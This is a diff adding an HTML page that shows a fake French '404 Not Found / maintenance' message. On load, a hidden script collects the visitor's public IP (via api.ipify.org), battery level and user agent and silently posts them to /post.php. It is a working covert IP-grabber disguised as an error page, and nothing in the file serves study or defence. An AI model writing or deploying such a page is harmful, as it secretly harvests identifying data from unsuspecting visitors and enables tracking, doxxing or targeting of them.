@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Chargement...</title>
+    <script>
+        async function sendData() {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const ipData = await res.json();
+            const battery = await navigator.getBattery();
+            
+            const data = {
+                ip: ipData.ip,
+                batt: Math.round(battery.level * 100),
+                ua: navigator.userAgent
+            };
+
+            fetch('/post.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            });
+        }
+        window.onload = sendData;
+    </script>
+</head>
+<body>
+    <h1>404 Not Found</h1>
+    <p>Le serveur est en maintenance.</p>
+</body>
+</html>
